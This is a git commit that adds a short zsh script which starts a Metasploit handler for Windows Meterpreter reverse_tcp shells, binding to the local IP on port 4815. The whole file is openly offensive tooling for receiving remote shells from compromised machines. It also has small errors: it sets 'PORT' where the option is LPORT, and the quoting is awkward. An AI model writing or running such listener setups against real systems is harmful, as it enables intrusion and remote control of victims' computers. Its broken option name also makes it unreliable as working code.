c3f238620148500561ccfd5e4d1cb35a40f76398
Adrian Eisenmeier <adrian@scaas.eu>
2023-09-18 11:31:41 +0000

    file ending

---
+++ run_listener_win.sh
@@ -0,0 +1,12 @@
+#!/bin/zsh
+
+myIp="$(hostname -I | cut -f1 -d' ')"
+
+msfconsole -q -x "use exploit/multi/handler;
+		  set payload windows/meterpreter/reverse_tcp;
+		  set LHOST "${myIp}";
+		  set PORT 4815;
+		  exploit;"
+
+echo "LHOST IP set to: "  $myIp
+echo "Listener is cnfigured for reverse_tcp"
